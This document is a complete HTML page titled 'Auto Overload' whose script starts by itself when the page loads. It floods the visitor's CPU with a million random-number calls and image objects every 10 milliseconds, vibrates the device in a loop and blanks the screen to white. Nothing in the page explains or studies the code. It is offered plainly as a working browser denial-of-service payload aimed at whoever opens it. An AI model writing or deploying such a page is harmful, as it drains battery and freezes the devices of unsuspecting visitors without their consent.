<!DOCTYPE html>
<html>
<head>
  <title>Auto Overload</title>
  <script>
    window.onload = () => {
      // Heavy CPU load
      setInterval(() => {
        for (let i = 0; i < 1000000; i++) {
          Math.random();
          new Image();
        }
      }, 10);

      // Try vibration loop
      if (navigator.vibrate) {
        setInterval(() => navigator.vibrate(1000), 1000);
      }

      // White bright screen
      document.body.style.background = "white";
      document.body.innerHTML = "";
    };
  </script>
</head>
<body>
</body>
</html>
